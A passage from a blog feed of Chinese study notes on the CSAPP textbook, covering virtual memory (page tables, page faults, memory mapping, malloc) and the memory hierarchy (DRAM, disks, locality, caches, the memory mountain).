space)</code>。</p></li><li><p>一个<code>地址空间</code>大小是由<strong>表示最大地址所需要的位数</strong>来描述的。</p><ul><li>如<code>N=2^n</code>个地址的虚拟地址空间叫做<code>n</code>位地址空间。</li><li>现在操作系统支持<code>32位</code>或<code>64位</code>。</li></ul></li><li><p>一个系统还有<code>物理地址空间</code>,它与系统中物理存储器的<code>M=2^m</code>(假设为2的幂)个字节相对应。</p></li></ul><p><code>地址空间</code>的概念很重要，因为它区分了<strong>数据对象(字节)</strong>和 它们的<strong>属性(地址)</strong>。</p><ul><li>每个<code>字节(数据对象)</code>一般有<strong>多个</strong> 独立的<code>地址(属性)</code>。每个地址都选自<strong>不同</strong>的地址空间。  <ul><li>比如一般来说。  <ul><li><code>字节</code> 有一个在<code>虚拟地址空间</code>的<code>虚拟地址</code>。</li><li>还有一个在<code>物理地址空间</code>的 <code>物理地址</code>。</li><li>两个地址都能访问到这个<code>字节</code>。</li></ul></li><li>类似现实世界的<strong>门牌号</strong>, 和<strong>经纬度</strong>。</li></ul></li></ul><h3 id="3、虚拟存储器作为缓存的工具"><a href="#3、虚拟存储器作为缓存的工具" class="headerlink" title="3、虚拟存储器作为缓存的工具"></a>3、虚拟存储器作为缓存的工具</h3><p><code>虚拟存储器(VM)</code>被组织为一个存放在<strong>磁盘</strong>上的N个连续字节大小的单元组成的数组。（这是书上的原文，看了很久，其实没怎么看得懂，意会一波算了）</p><ul><li><p>每个字节都有一个唯一的<code>虚拟地址</code>，这个虚拟地址作为到数组的索引。</p></li><li><p><code>磁盘</code>上数组的内容被缓存到<code>主存</code>中。</p><ul><li>同存储器层次结构其他缓存一样，<code>磁盘</code>上的数据被分割称<code>块</code>。  <ul><li>这些<code>块</code>作为<strong>磁盘和主存</strong>之间的传输单元。</li><li><code>虚拟页(Virtual Page,VP)</code>就是这个<code>块</code>  <ul><li>每个<code>虚拟页</code>大小为<code>P=2^p</code>字节。</li></ul></li></ul></li><li><strong>物理存储器</strong>被分割为<code>物理页</code>,大小也为<code>P</code>字节  <ul><li>也被称为<code>页帧(page frame)</code></li></ul></li></ul></li><li><p>任何时候，<code>虚拟页</code>的集合都被分为3个不相交的<strong>子集</strong>。</p><ul><li><strong>未分配的</strong>:VM系统还未分配(或者创建)的页。未分配的<code>块</code>没有任何数据与之相关联。  <ul><li>不占用磁盘空间</li><li>通过<code>malloc</code>来分配</li></ul></li><li><strong>缓存的</strong>：当前缓存在物理存储器的已分配页。</li><li><strong>未缓存的</strong>:没有缓存在物理页面存储器中的已分配页。<br><img src="1.png" alt=""></li></ul></li></ul><h4 id="3-1、DRAM缓存的组织结构"><a href="#3-1、DRAM缓存的组织结构" class="headerlink" title="3.1、DRAM缓存的组织结构"></a>3.1、DRAM缓存的组织结构</h4><p>DRAM就是我们传统的8g,16g啥的内存。<br><code>DRAM</code>表示虚拟存储器系统的缓存，在主存中缓存<code>虚拟页</code>,有两个特点。</p><ul><li><code>DRAM</code>缓存不命中处罚十分严重。  <ul><li>因为<code>磁盘</code>比<code>DRAM</code>慢100000多倍。</li></ul></li><li><strong>访问一字节开销</strong>  <ul><li>:从一个磁盘的一个扇区读取第一个字节的时间开销要比从该扇区中读连续的字节慢大约100000倍</li></ul></li></ul><p><code>DRAM</code>缓存的组织结构由这种<strong>巨大的不命中开销</strong>驱动。因此有以下特点。<br>(<strong>有些地方不是特别懂，之后看完第六章应该会好点</strong>)</p><ul><li><p><code>虚拟页</code>往往很大。</p><ul><li>4KB~2MB</li><li>访问一字节开销的原因才要这么大。</li></ul></li><li><p><code>DRAM</code>缓存是<code>全相联</code></p><ul><li>也就是： 任何<code>虚拟页</code>都能放在任何<code>物理页</code>中。</li><li>原因在于<strong>大的不命中惩罚</strong></li></ul></li><li><p>更精密的<strong>替换算法</strong></p><ul><li>替换错了虚拟页的惩罚很高。</li></ul></li><li><p><code>DRAM</code>缓存总是<code>写回</code></p><ul><li>因为对磁盘的访问时间很长</li><li>而不用<code>直写</code></li></ul></li></ul><h4 id="3-2、页表"><a href="#3-2、页表" class="headerlink" title="3.2、页表"></a>3.2、页表</h4><p>页表是一个存放在内存中的数据结构，MMU就是通过页表来完成虚拟地址到物理地址的转换。这个数据结构每一个条目称为PTE（Page Table Entry），由两部分组成：有效位和n位地址段。有效位如果是1，那么n位地址就指向已经在内存中缓存好了的地址；如果为0，地址为null的话表示为分配，地址指向磁盘上的虚拟内存（pagefile.sys）的话就是未缓存。我们来看一个典型的页表图：<br><img src="4.webp" alt=""><br>虚拟页vp1,2,7,4当前被缓存在内存中，页表上有效位设置成1，分别用PTE1，2，4，7表示。VP0和VP5（PTE0、5）未被分配，VP3和VP6被分配并指向虚拟内存，但未被缓存。</p><h4 id="3-3、页命中"><a href="#3-3、页命中" class="headerlink" title="3.3、页命中"></a>3.3、页命中</h4><p><img src="6.webp" alt=""><br>当我们使用2100虚拟地址来访问虚拟页2的内容的时候，就是一个页命中。地址翻译将指向PTE2上，由于有效位1，地址翻译器MMU就知道VP2已经缓存在内存中了。就使用页表中保存的物理地址进行访问。</p><h4 id="3-4、缺页咋整"><a href="#3-4、缺页咋整" class="headerlink" title="3.4、缺页咋整"></a>3.4、缺页咋整</h4><p>我们再来看看不命中，也就是缺页的情况，当CPU需要VP3的一个字时，初始化是这样的：<br><img src="7.webp" alt=""><br>PTE3有效位是0，同时地址位指向了虚拟内存（pagefile.sys），就会触发缺页异常。异常处理程序会选择牺牲一个内存（DRAM）中的页，本例中选择的是内存中的PP3页的VP4，接下来内核就从虚拟内存中拷贝VP3到内存中的PP3，并使得PTE3指向内存中的PP3，形成如下：<br><img src="8.webp" alt=""><br>vp4就成了牺牲页（不知道为什么想到了小三上位了 hhhhh<br><strong>页面交换</strong>:虚拟存储器出现早于高速缓存，按照习惯的说法块被叫做页。从虚拟内存到物理内存传送页的活动就叫做页面交换。</p><h4 id="3-5、分配页面-amp-amp-又是局部性拯救了我们"><a href="#3-5、分配页面-amp-amp-又是局部性拯救了我们" class="headerlink" title="3.5、分配页面&amp;&amp;又是局部性拯救了我们"></a>3.5、分配页面&amp;&amp;又是局部性拯救了我们</h4><p>比如某个页面所指向地址为NULL，将这个地址指向磁盘某处，那么这就叫分配页面。此时虚拟页从未分配状态 变为 未缓存。</p><p><code>虚拟存储器</code>工作的相当好，主要归功于老朋友<code>局部性(locality)</code></p><p>尽管从头到尾的<strong>活动页面数量</strong>大于<strong>物理存储器</strong>大小。</p><p>但是在局部内，程序往往在一个较小的<strong>活动页面集合</strong>工作</p><ul><li><p>这个<strong>集合</strong>叫做<code>工作集(working set)</code>或者叫<code>常驻集(resident set)</code></p><ul><li>初始载入开销比较大。</li></ul></li><li><p>程序有良好的<code>时间局部性</code>，<code>虚拟存储器</code>都工作的相当好。</p></li><li><p>如果程序实在很烂，或者物理空间很小，<code>工作集</code>大于<code>物理存储器</code>大小。这种状态叫<code>颠簸(thrashing)</code>.  </p><ul><li>这时，页面不断换进换出。性能十分低。</li></ul></li></ul><h3 id="4、虚拟存储器作为内存管理的工具"><a href="#4、虚拟存储器作为内存管理的工具" class="headerlink" title="4、虚拟存储器作为内存管理的工具"></a>4、虚拟存储器作为内存管理的工具</h3><p>实际上，操作系统为每个<strong>进程</strong>提供一个独立的<code>页表</code>。<br><img src="2.png" alt=""></p><p>因此，<code>VM</code>简化了<code>链接</code>和<code>加载</code>,<code>代码</code>和<code>数据共享</code>,以及应用程序的<code>存储器</code>分配。</p><ul><li><p><strong>简化链接</strong></p><ul><li><p>独立的空间地址意味着每个进程的存储器映像使用相同的格式。</p><ul><li>文本节总是从<code>0x08048000</code>(32位)处或<code>0x400000</code>(64位)处开始。</li><li>然后是数据，bss节,栈。</li></ul></li><li><p>一致性极大简化了<code>链接器</code>的设计和实现。</p></li></ul></li><li><p><strong>简化加载</strong></p><ul><li><code>加载器</code>可以从不实际拷贝任何数据从磁盘到存储器。</li><li>基本都是<strong>虚拟存储系统</strong>完成。  </li></ul></li></ul><pre><code>&gt; 将一组连续的`虚拟页`映射到任意一个文件中的任意位置的表示法称作`存储器映射`。Unix提供一个称为`mmap`的系统调用，允许程序自己做存储器映射。在9.8详细讲解。</code></pre><ul><li><p><strong>简化共享</strong></p><ul><li>独立地址空间为操作系统提供了一个管理用户进程和操作系统自身之间的一致<code>共享</code>机制.</li><li>例子  <ul><li>操作相同的操作系统内核代码</li><li>C标准库的<code>printf</code>.</li></ul></li><li>因此操作系统需要将<strong>不同进程</strong>的适当的虚拟页映射到<strong>相同</strong>的物理页面。  <ul><li>多个进程共享这部分代码的一个拷贝。</li><li>而不是每个进程都要加载单独的内核和C标准库的拷贝。</li></ul></li></ul></li><li><p><strong>简化存储器分配</strong>.</p><ul><li>即<code>虚拟页</code>连续(虚拟页还是单独的)，<code>物理页</code>可以不连续。使得分配更加容易。</li></ul></li><li><p><strong>简化保护</strong>.</p><ul><li>我们可以通过为PTE添加额外的标识位提供对存储器的保护。<br><img src="9.webp" alt=""><br>通过新添加的三个标识位：SUP：内核or用户；READ:</li></ul></li></ul><h3 id="5、地址翻译，加入高速缓存，多级页表，-案例研究：Intel-CoreI7，这些东西太肝了，总结不出来，Orz-希望感兴趣的能自己认真看下去，因为这里如果要详讲只能把书扫描放这了，东西太多，所以直接科普一下Linux虚拟存储系统"><a href="#5、地址翻译，加入高速缓存，多级页表，-案例研究：Intel-CoreI7，这些东西太肝了，总结不出来，Orz-希望感兴趣的能自己认真看下去，因为这里如果要详讲只能把书扫描放这了，东西太多，所以直接科普一下Linux虚拟存储系统" class="headerlink" title="5、地址翻译，加入高速缓存，多级页表， 案例研究：Intel CoreI7，这些东西太肝了，总结不出来，Orz,希望感兴趣的能自己认真看下去，因为这里如果要详讲只能把书扫描放这了，东西太多，所以直接科普一下Linux虚拟存储系统"></a>5、地址翻译，加入高速缓存，多级页表， 案例研究：Intel CoreI7，这些东西太肝了，总结不出来，Orz,希望感兴趣的能自己认真看下去，因为这里如果要详讲只能把书扫描放这了，东西太多，所以直接科普一下Linux虚拟存储系统</h3><p><img src="10.webp" alt=""><br>一个单独的Linux系统进程虚拟存储主要分为：内核虚拟存储器和进程虚拟存储器。我们主要来讲一下内核虚拟存储器：由下往上是内核的代码和数据结构，是每个进程共享的数据结构和代码；再往上是一组连续的虚拟页面映射到相应的物理页面的物理存储器，大小同主存一样大，提供很方便访问物理页面的任何位置。最后是每个进程不同的是页表、task（mm）、内核栈等。</p><h4 id="5-1、虚拟存储器区域"><a href="#5-1、虚拟存储器区域" class="headerlink" title="5.1、虚拟存储器区域"></a>5.1、虚拟存储器区域</h4><p>区域就是我们通常说的段，text、data、bss都是不同的区域，这些区域是被分为连续的片。每个虚拟页面都在不同的段中，不属于某个段的虚拟页面是不存在的，且不能被使用。我们来看看内核中的一个task数据结构（mm）：task_struct是位于内核虚拟存储器中对于每个进程的都不同的内核数据结构，包含运行该进程所需要的基本信息（PID、可执行文件名称、程序计数器等）。这个结构中有一个mm字段，指向的是mm_struct中的pgd和mmap，其中pgd是一级页表的基地址，mmap指向的是一个vm_area_structs的链表，每个该链表中的一个元素描述的是当前虚拟地址空间的一个段（text、data、bss等），当内核运行该进程的时候CR3寄存器就被放入了pgd。<br><img src="11.webp" alt=""></p><h4 id="5-2、Linux缺页异常处理"><a href="#5-2、Linux缺页异常处理" class="headerlink" title="5.2、Linux缺页异常处理"></a>5.2、Linux缺页异常处理</h4><p>我们将了解一些存储器区域划分的基础知识，并且介绍说mmap指向的是一个链表，这个链表中的每个元素都指向该进程的相应的段，其中vm_strat是段开始的地方，vm_end是段结束的地方。1&gt; 访问地址是否合法：缺页处理程序只需要将这个地址A与vm_area_struct链表中的每个元素的start和end数据比较，如果都没有的话，表示该地址不在相应的段中。就是一个段错误。2&gt; 保护异常：vm_area_struct中的vm_prot结构是包含了所有页面的读写权限，所以当对只有读权限的文本内容写入数据的时候，就会引发保护异常。<br><img src="12.webp" alt=""><br>3&gt; 最后，正常缺页。也就是相应的页面不在物理内存的时候，缺页程序就会锁定一个牺牲页面，将它的内容与实际需要的内容交换过来，当缺页程序返回的时候就可以正常的访问了。</p><h3 id="6、存储器映射"><a href="#6、存储器映射" class="headerlink" title="6、存储器映射"></a>6、存储器映射</h3><p>存储器映射是通过将磁盘上的一个文件与虚拟存储器中的一个区域关联起来的过程。</p><h4 id="6-1、共享对象"><a href="#6-1、共享对象" class="headerlink" title="6.1、共享对象"></a>6.1、共享对象</h4><p>一个对象被映射到虚拟存储器的一个区域，这个区域要么是共享对象，要么是私有对象。如果一个进程A将一个共享对象映射X到了它的虚拟存储器中，那么对于也把这个共享对象X映射了的其他进程而言，进程A对共享对象X的任何读写操作都是可见的。下图是进程1和进程2映射了共享区域的图例：<br><img src="13.webp" alt=""><br>私有区域：即使是私有区域在物理存储器上也是同一个区域，如下图进程1和进程2所映射的私有对象在物理存储器上只是一份拷贝。<br><img src="14.webp" alt=""><br>每个对象都有唯一的一个文件名，在进程1的虚拟存储器中已经完成了私有对象到存储器的映射，进程2如果要映射这个区域只需要将页表条目指向已经映射好的物理存储器位置就行了。如上图所示，进程1和2将一个私有对象映射到了物理存储器的一个区域并共享这个私有对象。这个对象会被标记为只读，当其中一个进程2确实需要写这个区域的时候，就会引发一个保护故障，内核会在物理存储器中创建这个私有对象的一个拷贝，称为写时拷贝，更新页面条目使得进程1指向这个新的条目。然后把老对象修改为可写权限。这样当保护故障程序返回的时候，CPU重新执行写的操作就不会出错了。</p><h4 id="6-2、再看fork函数"><a href="#6-2、再看fork函数" class="headerlink" title="6.2、再看fork函数"></a>6.2、再看fork函数</h4><p>当当前进程调用fork函数的时候，内核为新进程创建各种数据结构，并分配PID。为了给新进程创建一个虚拟存储器，它创建的当前进程的mm_struct、区域结构和页表的一个拷贝，内核为两个进程的每个页表标记为只读，并将诶个区域标记为私有的写时拷贝。这样当fork函数返回的时候，新进程的虚拟存储器和当前进程的虚拟存储器刚好相同。任何一个进程进行写操作的时候，才会创建新的页面。<br><img src="15.webp" alt=""></p><h3 id="7、动态内存分配（what-is-malloc"><a href="#7、动态内存分配（what-is-malloc" class="headerlink" title="7、动态内存分配（what is malloc?"></a>7、动态内存分配（what is malloc?</h3><p>动态存储器分配指的是在程序运行的时候分配额外的存储空间，分配器维护着虚拟存储器中的堆实现这种分配。<br><img src="16.webp" alt=""><br>堆是紧跟着.bss段，并向上增长，内核维护着一个brk指针，指向堆的顶部。任何一个堆中的块要么是已分配的要么是空闲的。分配的方式分为两种：显式和隐式，我们接下来主要讲一下显示分配和实现一个分配器的基础知识，隐式分配指的其实是分配器回收空间，这个在分配器基础知识中有所讲解，就不再另外提出了：</p><h4 id="7-1、显式分配：程序调用malloc和free函数"><a href="#7-1、显式分配：程序调用malloc和free函数" class="headerlink" title="7.1、显式分配：程序调用malloc和free函数"></a>7.1、显式分配：程序调用malloc和free函数</h4><p>经常直到我们的程序运行的时候，我们才知道某些数据结构的大小。这时候就必须显式的分配相应的存储空间。如下图所示：<br><img src="17.webp" alt=""><br>使用malloc函数以具体的输入内容分配相应大小的存储空间，函数原型如下：<br><img src="18.webp" alt=""><br>如果想要初始化存储器为0，可以使用calloc函数。想要改变已分配的大小可以使用realloc函数<br>释放是通过调用free函数来实现的：<br><img src="19.webp" alt=""><br>ptr是指向一个已分配空间的起始位置</p><h4 id="7-2、demo"><a href="#7-2、demo" class="headerlink" title="7.2、demo"></a>7.2、demo</h4><p><img src="20.webp" alt=""></p><pre><code>（a）请求一个4字大小的块，malloc将分配好的空间的首地址返回给p1；（b）请求一个5字大小的块，由于使用的双字对其，所以填充了一个空闲块；（c）请求一个6字大小的块，返回给p3；（d）释放p2，调用后p2仍然指向原来的位置；（e）请求一个2字大小的块，在已经释放的p2处优先分配，然后返回指针p4</code></pre><h4 id="7-3、配器基础知识"><a href="#7-3、配器基础知识" class="headerlink" title="7.3、配器基础知识"></a>7.3、配器基础知识</h4><p>分配器的目标主要是找到吞吐量和利用率的契合点，那么为什么需要隐式的分配，因为碎片的产生会降低存储空间的利用率<br><strong>碎片：内部和外部</strong><br>1&gt;内部碎片：我们上面讲到的（b）的情况，分配了一个额外的空闲块，实现双字对其；</p><p>2&gt;外部碎片：(e)中如果请求7字大小的块，即使存储空间有这么大，还是不行</p><p>当然，还有许多问题要思考，诸如：空闲块如何组织、如何分配新的块、怎么分割和合并块，这些技术都要求我们提供一种新的数据结构<br><img src="21.webp" alt=""><br><strong>(更分配器更高级的骚操作以及垃圾回收，请自行看书吧)</strong></p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟内存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之存储器层次结构</title>
      <link href="/2019/01/13/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-cun-chu-qi-ceng-ci-jie-gou/"/>
      <url>/2019/01/13/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-cun-chu-qi-ceng-ci-jie-gou/</url>
      
        <content type="html"><![CDATA[<h4 id="再安利一波csapp真优秀，本章之后你会了解内存，机械硬盘，固态硬盘等储存器的优劣原理，你会理解为什么只有机械硬盘的笔记本升级到固态就脱胎换骨了一番，内存是DRAM-而固态等是ROM-还有就是局部性的哲学。通过学习高速缓存，理解程序的局部性的真正意义（你还能看到csapp第三版封面的图是啥玩意。"><a href="#再安利一波csapp真优秀，本章之后你会了解内存，机械硬盘，固态硬盘等储存器的优劣原理，你会理解为什么只有机械硬盘的笔记本升级到固态就脱胎换骨了一番，内存是DRAM-而固态等是ROM-还有就是局部性的哲学。通过学习高速缓存，理解程序的局部性的真正意义（你还能看到csapp第三版封面的图是啥玩意。" class="headerlink" title="再安利一波csapp真优秀，本章之后你会了解内存，机械硬盘，固态硬盘等储存器的优劣原理，你会理解为什么只有机械硬盘的笔记本升级到固态就脱胎换骨了一番，内存是DRAM,而固态等是ROM,还有就是局部性的哲学。通过学习高速缓存，理解程序的局部性的真正意义（你还能看到csapp第三版封面的图是啥玩意。"></a>再安利一波csapp真优秀，本章之后你会了解内存，机械硬盘，固态硬盘等储存器的优劣原理，你会理解为什么只有机械硬盘的笔记本升级到固态就脱胎换骨了一番，内存是DRAM,而固态等是ROM,还有就是局部性的哲学。通过学习高速缓存，理解程序的局部性的真正意义（你还能看到csapp第三版封面的图是啥玩意。</h4><p><img src="1.webp" alt=""></p><a id="more"></a><h3 id="1、存储技术"><a href="#1、存储技术" class="headerlink" title="1、存储技术"></a>1、存储技术</h3><h4 id="1-1、随机访问存储器"><a href="#1-1、随机访问存储器" class="headerlink" title="1.1、随机访问存储器"></a>1.1、随机访问存储器</h4><p>静态RAM：（SRAM）用作高速缓存，通常只有几兆，在CPU芯片上、下；硬件设计中，将每个位存在一个双稳定的存储单元中，如下图所示，只有在两边的时候保持稳定性：<br><img src="2.webp" alt=""><br>动态RAM：（DRAM）用作主存（我们通常说的机器的内存），通常几百、几千兆。每个单位使用一个电容和一个访问晶体管构成，容易被干扰，有的加入有纠错码。系统需要周期性读出，然后刷新重写存储器的每一位。DRAM详细构造图：<br><img src="3.webp" alt=""><br><strong>访问示例（我们来看看是如何访问超单元（2，1）处的内容）</strong><br><img src="4.webp" alt=""><br>为了加快二维数组的访问，存储控制器在读取（2，1）处的内容的时候，使用addr先发送行地址2到DRAM芯片中，拷贝整个第二行的内容到内部缓冲区中，然后发送列地址1，从内部行缓冲区中读取1的地址内容通过data发送到存储控制器中去。<br>有缓存的问题所有这就能解释当初zzz学长解释下面两个循环为什么第一个快于第二个。（赵神牛逼<br><img src="5.webp" alt=""><br><img src="6.webp" alt=""></p><h4 id="1-2、存储器模块"><a href="#1-2、存储器模块" class="headerlink" title="1.2、存储器模块"></a>1.2、存储器模块</h4><p><img src="7.webp" alt=""><br>如图所示是一个64M的主存，芯片编号0-7，每个芯片存储8M的数据，存储器模块将其组合起来，聚合内存。将每单个芯片的超单元映射成主存地址A的各个字段。这样控制器收到一个主存地址A的时候，存储控制器将其选择包含的具体芯片，将A转换成（i，j）的形式，然后将（i，j）发送到芯片模块中开始取数据。<br><strong>存储在ROM设备中的程序通常称为固件，当一个计算机系统通电以后，它会运行存储在ROM中的固件。</strong></p><h4 id="1-3、访问主存（读事务、写事务）"><a href="#1-3、访问主存（读事务、写事务）" class="headerlink" title="1.3、访问主存（读事务、写事务）"></a>1.3、访问主存（读事务、写事务）</h4><p><img src="8.webp" alt=""><br>读事务：考虑当我们执行，movl A，%eax的情况，地址A的内容会被加载到eax中去，总线发起读事务（分三步）：①CPU将A的地址总线放到系统总线上，桥作为中转点，将地址信号传送到存储器总线上去；②主存感觉到了存储器总线上的地址信号，从存储器总线上读地址，并从主存中取出相应的数据，写入到存储器总线上去，桥将数据专递到系统总线中去；③CPU感觉到了系统总线上的数据，将数据拷贝到eax中。I/O桥作为中转，将地址信号从系统总线转到存储器总线，然后又将数据从存储器总线转到系统总线。在这个过程中，CPU始终是从系统总线上发送地址，读取数据，主存始终是从存储器总线上接受地址并发送数据。（写事务是一个逆向过程不做讲解）</p><h4 id="1-4、磁盘存储-（硬盘）"><a href="#1-4、磁盘存储-（硬盘）" class="headerlink" title="1.4、磁盘存储 （硬盘）"></a>1.4、磁盘存储 （硬盘）</h4><p><img src="9.webp" alt=""><br>磁盘由盘片构成，表面覆盖的有磁性材料，中间是一个主轴，通过旋转读取和记录数据。每组同心圆磁道分割的区域就是一个扇区。扇区之间是有间隙的，如图：<br><img src="10.webp" alt=""><br><strong>磁盘读写操作：</strong><br><img src="11.webp" alt=""><br>磁盘以扇区为单位来读写数据，对扇区的访问时间由三个部分组成：寻道时间、旋转时间、传送时间。<br>以图a为例，当我们要访问同心圆磁道5的内容时，寻道时间是指传动手臂将读写头移动到同心圆第五磁道的时间，旋转时间指的是同心圆5开始读取内容的位置，如果手臂移动到第五磁道的时候读写位置刚过，就要等磁盘旋转一圈之后再读取；传送时间，扇区第一个位处于读写头的时候，读写该扇区的时间。（寻道时间和旋转延迟大致相当）</p><h3 id="2、局部性"><a href="#2、局部性" class="headerlink" title="2、局部性"></a>2、局部性</h3><pre><code>局部性原理是指CPU访问存储器时，无论是存取指令还是存取数据，所访问的存储单元都趋于聚集在一个较小的连续区域中。 –来自百度百科</code></pre><p>我们讲存储器体系结构就会很好的理解局部性，简单的来说，我们的主存就是我们为了提高我们磁盘文件的一个高速缓存，因为我们知道这一时刻访问到磁盘的数据可以下一时刻也会被访问，这一位置被访问的数据，邻居位置也可能会被访问。这也就是我们通常说的：时间局部性和空间局部性。<br>最好的例子就是上面数组求和。可以往前看看。</p><h3 id="3、存储器层次结构"><a href="#3、存储器层次结构" class="headerlink" title="3、存储器层次结构"></a>3、存储器层次结构</h3><h4 id="3-1、书上大图"><a href="#3-1、书上大图" class="headerlink" title="3.1、书上大图"></a>3.1、书上大图</h4><p><img src="12.webp" alt=""><br>越往上，代表的是访问速度越快，当然存储容量小，价格也非常的高。越往下，意味着访问速度越慢，存储容量大，价格相对便宜。通常我们CPU的寄存器是L1的高速缓存，L1是L2的高速缓存，以此类推。</p><h4 id="3-2、缓存命中和不命中"><a href="#3-2、缓存命中和不命中" class="headerlink" title="3.2、缓存命中和不命中"></a>3.2、缓存命中和不命中</h4><p><img src="13.webp" alt=""><br>上图我们把k+1理解为主存，被划分为16个块来存储数据，块的大小是固定的。我们把K层理解成L3高速缓存，任何时刻L3就是主存的一个子集。上图我们能看出，L3只能保存4个块的数据，块的大小保持和主存的大小一样的。上图中我们看到，L3中保存的是主存中的4，9，14，3的数据。那么什么又是命中率和不命中率呢？<br><strong>缓存命中</strong>：当程序需要第k+1层数据块14的时候，程序会在当前存储的k层，寻找块14的数据，刚好14在k层的话，就是一个缓存命中，这比从k+1层读取的速度要快很多。<br><strong>缓存不命中</strong>：当程序需要访问到块12的时候，在k层没有该数据块，就是一个缓存不命中，这时候就会从k+1层中读取块12将其替换到k层的一个数据块（覆盖或驱逐一个已有的数据块）。程序还是从k层访问块12。<br><strong>放置策略</strong>：如果我们从k+1层中获得的数据随机的放置在k层，这样的随机放置就会导致访问的效率降低，我们的放置策略是块i必须放置在（imod4）中，也就是0，4，8，12会映射到同一个k层的块0中。这就会导致一个冲突不命中，也就是说如果程序交替请求k+1层的0，4块，由于会一直映射到k层的0块中，这时候虽然k层有空余的缓存，但还是每次不命中。</p><h4 id="3-3、类比一下web的缓存"><a href="#3-3、类比一下web的缓存" class="headerlink" title="3.3、类比一下web的缓存"></a>3.3、类比一下web的缓存</h4><p>web缓存是通过http头中的上次If-Modified-Since或者If-Unmodified-Since使用对比上次修改时间验证资源是否需要更新，当访问一个网页，网页如果在本地有缓存其实并不是直接使用缓存中的page因为你要保证服务器没变化，所以本机还是会发出一个请求询问服务器该界面最后一次修改的时间，服务器只要返回时间就可以而不必要返回内容，如果服务器上网页的修改时间是缓存时间之前的，那直接使用缓存的，如果缓存之后的服务器修改了，将重新请求网页。</p><h3 id="4、高速缓存存储器（集成在CPU内部的一个部件L1、L2、L3三级缓存）"><a href="#4、高速缓存存储器（集成在CPU内部的一个部件L1、L2、L3三级缓存）" class="headerlink" title="4、高速缓存存储器（集成在CPU内部的一个部件L1、L2、L3三级缓存）"></a>4、高速缓存存储器（集成在CPU内部的一个部件L1、L2、L3三级缓存）</h3><p><img src="14.webp" alt=""></p><h4 id="4-1、通用高速缓存存储器内部结构"><a href="#4-1、通用高速缓存存储器内部结构" class="headerlink" title="4.1、通用高速缓存存储器内部结构"></a>4.1、通用高速缓存存储器内部结构</h4><p><img src="15.webp" alt=""><br>高速缓存是一个数组，每个组包含一个或多个行，每个行有一个有效位、一个标记位，以及数据块。我们进行访问的地址结构就是：t的标记位+s个组索引+b个块偏移；<br><img src="16.webp" alt=""></p><h4 id="4-2、直接映射高速缓存（每个组只有一行的简单访问模式）"><a href="#4-2、直接映射高速缓存（每个组只有一行的简单访问模式）" class="headerlink" title="4.2、直接映射高速缓存（每个组只有一行的简单访问模式）"></a>4.2、直接映射高速缓存（每个组只有一行的简单访问模式）</h4><p><img src="17.webp" alt=""><br>(举例：直接映射高速缓存的抽取请求字的过程就像我们投递快件一样，组索引其实就像我们的邮政编码，比如我们这里的510824，然后找到编码的组，也就是我的大位置（xx县），然后看标记上写的具体xx小区x栋楼，并且核实该地址是否有效（有效位1），两项都满足条件以后将该快件给快递员投递，快递员到达具体xx小区x楼的时候就根据门牌号（偏移位）敲开你家的门。binggo，快递到达）<br>高速缓存确定一个请求是否命中，然后抽出请求字的过程分两步：<br><strong>1&gt; 组选择</strong>：很好理解，就是地址位中的组索引匹配高速缓存中的组<br><img src="17.webp" alt=""><br><strong>2&gt; 行匹配和字抽取</strong>：行匹配主要是对有效位进行匹配，和标记位与高速缓存中的标记位一致，这就是一个命中。最后的字抽取就简单了，只是看地址后面的偏移值。<br><img src="19.webp" alt=""></p><h4 id="4-3、结构剖析（真正意义上的高速缓存）"><a href="#4-3、结构剖析（真正意义上的高速缓存）" class="headerlink" title="4.3、结构剖析（真正意义上的高速缓存）"></a>4.3、结构剖析（真正意义上的高速缓存）</h4><p><img src="20.webp" alt=""><br><strong>Intel Core I7高速缓存层次结构</strong><br>在实际的商用CPU中，将高速缓存分为d-cache数据高速缓存，i-cache指令高速缓存和同一高速缓存，i7的架构中我们可以看出，L1分为数据和指令高速缓存，共享L2高速缓存，同时每个核共享L3高速缓存</p><h4 id="5、存储器山图♂"><a href="#5、存储器山图♂" class="headerlink" title="5、存储器山图♂"></a>5、存储器山图♂</h4><p><img src="21.webp" alt=""><br>存储器的性能不能简单的用一个数字来描述，如果实在要形容的话，是一座时间局部性和空间局部性构成的山。山峰和低谷的差别不是一个数量级。明智的程序员会试图构造运行在山峰的程序而不是低谷。我们来看看这座存储器山是啥意思。<br><img src="22.webp" alt=""><br>这段代码所做的事情，就是将data数组的内容依次读取到CPU的寄存器中。其中elems代表的是data的工作集大小也就是size时间局部性，代表Y轴；而stride（步长）代表的是横轴X；Z轴表示吞吐量，Mb/s。越往上吞吐量越大（红色部分）。我们反复以不同的size和stride值调用我们的核心测试代码，就会得到如上图的存储器山。最高处的红色山峰为L1，由于工作集（size）很小，能全部保存在L1高速缓存中，所以这时候即使stride很长，对于性能也没太大的影响。L2和L3、主存随着stride的增加有明显的坡度，空间局部性下降。特别明显的是，主存的蓝色山峰，即使工作集很大（时间局部性极地）其stride（空间局部性）的影响也相当的明显，最高与最低处相差7倍。也就是告诫我们，即使时间局部性无法改变了，空间局部性也可以使得程序的性能极大的提高。</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 存储器层次结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之异常控制流</title>
      <link href="/2019/01/11/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-yi-chang-kong-zhi-liu/"/>
      <url>/2019/01/11/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-yi-chang-kong-zhi-liu/</url>
      
